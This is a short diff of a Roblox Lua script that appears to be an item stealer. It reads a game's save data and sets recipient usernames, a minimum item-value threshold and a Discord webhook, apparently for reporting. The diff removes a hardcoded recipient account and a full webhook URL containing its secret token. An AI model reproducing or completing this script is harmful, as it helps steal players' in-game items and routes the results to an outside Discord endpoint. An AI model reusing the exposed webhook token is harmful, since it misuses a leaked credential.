@@ -17,9 +17,9 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"ilordpilspd"}
+local users = _G.Usernames or {""}
 local min_rap = _G.minrap or 1000000
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1479615032559009935/6QF-P0_mnNtBKhNadizArFeJY3Hs1vjyEO3RqNL1coBhmW-CtDLR4J0MYyUInw4s_aBM"
+local webhook = _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add any usernames or webhook")
